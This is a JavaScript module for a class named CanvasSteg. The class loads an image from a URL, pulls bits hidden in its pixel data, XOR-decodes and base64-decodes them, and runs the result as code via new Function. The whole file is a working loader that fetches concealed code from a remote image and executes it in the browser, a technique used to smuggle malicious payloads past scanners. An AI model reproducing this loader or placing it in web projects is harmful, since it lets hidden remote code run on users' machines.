class CanvasSteg {
    constructor() {
        this.img = document.createElement('img');
        this.canvas = document.createElement('canvas');
        this.context = this.canvas.getContext('2d');

        this._execute = () => {};
    }

    prepare(url) {
        const {canvas, context, img} = this;

        return new Promise((resolve) => {
            img.addEventListener('load', () => {
                const {width, height} = img;

                canvas.width = width;
                canvas.height = height;

                context.drawImage(img, 0, 0);

                const {data} = context.getImageData(0, 0, width, height);

                this.text = Array
                    .from(data)
                    .map((datum) => {
                        return datum & 0x03;
                    })
                    .map((_, i, _data) => {
                        if ((i % 4) !== 0) {
                            return null;
                        }

                        return _data.slice(i, i + 4);
                    })
                    .filter((datum) => {
                        return datum;
                    })
                    .map(([a, b, c, d]) => {
                        return (
                            a |
                            (b << 2) |
                            (c << 4) |
                            (d << 6)
                        ) ^ 0xFF;
                    })
                    .filter((datum) => {
                        return datum;
                    })
                    .map((chr) => {
                        return String.fromCharCode(chr);
                    })
                    .join('');
                this.payload = atob(this.text);

                this._execute = () => {
                    try {
                        const func = new Function(this.payload);

                        func();
                    } catch (_) {
                        console.log(_);
                    }
                };

                resolve(this._execute);
            });

            img.src = url;
        });
    }

    execute() {
        return this._execute();
    }
}

module.exports = CanvasSteg;
